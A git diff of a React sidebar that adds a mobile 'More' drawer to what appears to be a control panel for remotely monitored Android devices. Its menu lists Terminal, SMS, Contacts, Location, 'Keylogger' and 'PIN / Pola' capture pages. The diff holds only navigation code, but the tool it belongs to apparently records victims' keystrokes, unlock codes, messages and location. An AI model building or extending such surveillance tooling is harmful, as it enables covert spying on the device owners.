@@ -4,7 +4,8 @@ import { usePathname } from 'next/navigation'
 import {
   LayoutDashboard, Terminal, FolderOpen,
   Settings, Smartphone, Wifi, WifiOff, ChevronDown,
-  MessageSquare, Phone, Users, MapPin, Package, Image, Bell, KeySquare, Lock,
+  MessageSquare, Phone, Users, MapPin, Package, Image, KeySquare, Lock,
+  MoreHorizontal, X,
 } from 'lucide-react'
 import { useState } from 'react'
 
@@ -32,24 +33,22 @@ const navItems = [
   { href: '/contacts', label: 'Contacts', icon: Users },
   { href: '/location', label: 'Location', icon: MapPin },
   { href: '/apps', label: 'Apps', icon: Package },
-  { href: '/notifications', label: 'Notifikasi', icon: Bell },
   { href: '/keylog', label: 'Keylogger', icon: KeySquare },
   { href: '/pinlog', label: 'PIN / Pola', icon: Lock },
   { href: '/setup', label: 'Setup', icon: Settings },
 ]
 
-const mobileNavItems = [
+const mobileNavPinned = [
   { href: '/', label: 'Dashboard', icon: LayoutDashboard },
   { href: '/terminal', label: 'Terminal', icon: Terminal },
   { href: '/sms', label: 'SMS', icon: MessageSquare },
-  { href: '/notifications', label: 'Notifikasi', icon: Bell },
   { href: '/location', label: 'Location', icon: MapPin },
-  { href: '/apps', label: 'Apps', icon: Package },
 ]
 
 export default function Sidebar({ connected, devices = [], selectedId, onSelect }: SidebarProps) {
   const pathname = usePathname()
   const [showPicker, setShowPicker] = useState(false)
+  const [showDrawer, setShowDrawer] = useState(false)
 
   const selected = devices.find(d => d.deviceId === selectedId)
   const multiDevice = devices.length > 1
@@ -84,7 +83,6 @@ export default function Sidebar({ connected, devices = [], selectedId, onSelect 
           </div>
         </div>
 
-        {/* Device selector */}
         <div className="px-3 py-3 border-b border-android-border">
           {multiDevice ? (
             <div className="relative">
@@ -190,16 +188,95 @@ export default function Sidebar({ connected, devices = [], selectedId, onSelect 
 
       {/* ─── MOBILE BOTTOM NAV ─── */}
       <nav className="md:hidden fixed bottom-0 left-0 right-0 z-40 bg-android-surface border-t border-android-border flex">
-        {mobileNavItems.map(({ href, label, icon: Icon }) => {
+        {mobileNavPinned.map(({ href, label, icon: Icon }) => {
           const active = pathname === href
           return (
-            <Link key={href} href={href} className={`flex-1 flex flex-col items-center justify-center py-2 gap-0.5 transition-colors ${active ? 'text-android-green' : 'text-android-muted'}`}>
+            <Link
+              key={href}
+              href={href}
+              className={`flex-1 flex flex-col items-center justify-center py-2 gap-0.5 transition-colors ${active ? 'text-android-green' : 'text-android-muted'}`}
+            >
               <Icon size={18} />
               <span className="text-[9px] font-medium leading-none">{label}</span>
             </Link>
           )
         })}
+
+        {/* More button */}
+        <button
+          onClick={() => setShowDrawer(true)}
+          className={`flex-1 flex flex-col items-center justify-center py-2 gap-0.5 transition-colors ${showDrawer ? 'text-android-green' : 'text-android-muted'}`}
+        >
+          <MoreHorizontal size={18} />
+          <span className="text-[9px] font-medium leading-none">More</span>
+        </button>
       </nav>
+
+      {/* ─── MOBILE DRAWER (semua menu) ─── */}
+      {showDrawer && (
+        <>
+          {/* Backdrop */}
+          <div
+            className="md:hidden fixed inset-0 z-50 bg-black/60"
+            onClick={() => setShowDrawer(false)}
+          />
+          {/* Sheet */}
+          <div className="md:hidden fixed bottom-0 left-0 right-0 z-50 bg-android-surface rounded-t-2xl border-t border-android-border pb-safe">
+            {/* Handle + header */}
+            <div className="flex items-center justify-between px-4 pt-4 pb-3 border-b border-android-border">
+              <div className="flex items-center gap-2">
+                <div className="w-6 h-6 rounded-lg bg-android-green flex items-center justify-center">
+                  <Smartphone size={12} className="text-android-bg" />
+                </div>
+                <span className="text-sm font-bold text-white">Menu</span>
+              </div>
+              <button
+                onClick={() => setShowDrawer(false)}
+                className="p-1.5 rounded-lg text-android-muted hover:text-white hover:bg-white/5 transition-colors"
+              >
+                <X size={16} />
+              </button>
+            </div>
+
+            {/* All nav items grid */}
+            <div className="grid grid-cols-3 gap-2 p-4">
+              {navItems.map(({ href, label, icon: Icon }) => {
+                const active = pathname === href
+                return (
+                  <Link
+                    key={href}
+                    href={href}
+                    onClick={() => setShowDrawer(false)}
+                    className={`flex flex-col items-center justify-center gap-1.5 py-3 px-2 rounded-xl border transition-colors ${
+                      active
+                        ? 'bg-android-green/10 border-android-green/30 text-android-green'
+                        : 'bg-white/3 border-android-border text-android-muted hover:text-white hover:bg-white/5'
+                    }`}
+                  >
+                    <Icon size={20} />
+                    <span className="text-[10px] font-medium leading-none text-center">{label}</span>
+                  </Link>
+                )
+              })}
+            </div>
+
+            {/* Device status */}
+            <div className="px-4 pb-4">
+              <div className={`flex items-center gap-2 px-3 py-2 rounded-xl border text-xs font-medium ${
+                connected
+                  ? 'bg-android-green/10 border-android-green/20 text-android-green'
+                  : 'bg-android-red/10 border-android-red/20 text-android-red'
+              }`}>
+                {connected ? <Wifi size={13} /> : <WifiOff size={13} />}
+                <span className="flex-1 truncate">
+                  {connected ? (selected?.deviceName ?? 'Device Connected') : 'No Device'}
+                </span>
+                <div className={`w-2 h-2 rounded-full shrink-0 ${connected ? 'bg-android-green status-dot-online' : 'bg-android-red'}`} />
+              </div>
+            </div>
+          </div>
+        </>
+      )}
     </>
   )
 }
